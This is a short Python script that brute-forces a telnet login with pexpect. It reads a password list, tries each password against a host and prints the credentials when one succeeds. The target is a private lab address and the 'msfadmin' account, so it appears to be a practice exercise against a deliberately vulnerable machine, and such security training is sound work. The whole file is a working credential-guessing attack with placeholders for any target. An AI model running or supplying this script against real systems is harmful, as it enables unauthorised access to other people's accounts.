import pexpect

def attempt_login(host, user, password):
    try:
        child = pexpect.spawn(f'telnet {host}')
        child.expect('login: ')
        child.sendline(user)
        child.expect('Password: ')
        child.sendline(password)
	
        index = child.expect(['Login incorrect', 'Welcome', pexpect.EOF, pexpect.TIMEOUT], timeout=10)
        print(child.before.decode())  # Debugging: Print the session output
        child.close()

        if index == 1:  # Successful login prompt
            return True
        return False  # Explicitly return False if login is unsuccessful.
    except Exception as e:
        print(f"Error: {e}")
        return False  # Return False if an exception occurs.

def brute_force(host, user, password_file):
    success = False  # Flag to track successful login
    with open(password_file, 'r') as file:
        for password in file:
            password = password.strip()
            print(f"Trying password: {password}")
            if attempt_login(host, user, password):
                print(f"Success! Username: {user} Password: {password}")
                success = True
                break  # Exit the loop after successful login

    if not success:
        print("")

# Usage
host = "192.168.56.102"  # Replace with the target IP
user = "msfadmin"  # Replace with the target username
password_file = "pass.txt"  # Replace with the path to your password list

brute_force(host, user, password_file)
